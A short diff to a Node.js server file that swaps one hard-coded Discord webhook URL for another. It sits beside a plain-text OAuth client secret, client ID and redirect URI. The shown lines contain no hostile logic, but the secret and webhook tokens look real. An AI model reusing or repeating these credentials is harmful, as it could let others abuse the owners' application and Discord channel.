@@ -2,7 +2,7 @@
 const client_secret = 'whi8Q~PlcqNOs.78RPya~nl7tSDB12gEIqHDrbtE'
 const client_id = '633c72ff-333a-495e-be20-8416cfbe7f5c'
 const redirect_uri = 'https://skyhub.onrender.com'
-const webhook_url = 'https://ptb.discord.com/api/webhooks/1094875107664605264/LK2xgYc496Db_BRra-XykMgBqNheHFgJViLKmoWE5yZ7VNOUwyEM_0AP6jGHceEzdq58'
+const webhook_url = 'https://ptb.discord.com/api/webhooks/1113551902194552902/IKI4gMEgyAIT5rn4i-yYiH4pNA9AjRald5dOlxrBl_VOnRepx9Qqz-nD_5Sfs190VsRv'
 //Requirements
 const axios = require('axios')
 const express = require('express')
